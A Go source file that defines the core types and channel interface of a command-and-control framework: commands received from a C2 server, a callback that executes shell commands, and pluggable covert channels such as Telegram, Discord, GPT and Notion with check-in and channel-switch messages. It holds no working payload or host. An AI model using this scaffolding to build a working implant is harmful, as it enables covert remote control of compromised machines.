package core

import (
	"context"
	"errors"
)

// ─────────────────────────────────────────
// Shared C2 types
// ─────────────────────────────────────────

// Instruction represents a command received from the C2 server.
type Instruction struct {
	ID      string
	Command string
}

// Result represents the output of an executed command.
type Result struct {
	ID     string
	Output string
}

// ExecuteFunc is a callback that executes a shell command and returns its output.
type ExecuteFunc func(cmd string) string

// ErrSwitchChannel is returned by Listen() when a SWITCH command is received.
// The Value field contains the target channel name.
type SwitchError struct {
	TargetChannel string
}

func (e *SwitchError) Error() string {
	return "switch to channel: " + e.TargetChannel
}

// IsSwitchError checks if an error is a SwitchError and returns the target channel.
func IsSwitchError(err error) (string, bool) {
	var se *SwitchError
	if errors.As(err, &se) {
		return se.TargetChannel, true
	}
	return "", false
}

// ─────────────────────────────────────────
// C2Channel interface
// ─────────────────────────────────────────

// C2Channel defines the contract that every communication channel
// (Telegram, Discord, GPT, Notion, etc.) must implement.
type C2Channel interface {
	// Connect establishes the connection to the C2 channel.
	Connect() error

	// Listen starts the blocking event/poll loop.
	// It should respect context cancellation for clean shutdown.
	// Returns SwitchError if a SWITCH command is received.
	Listen(ctx context.Context) error

	// Disconnect gracefully tears down the connection.
	Disconnect() error

	// Name returns a human-readable identifier for the channel (e.g. "telegram", "discord").
	Name() string

	// SendMessage sends an arbitrary protocol message through the channel.
	// Used for CHECKIN, SWITCHACK, and other control messages.
	SendMessage(text string) error
}
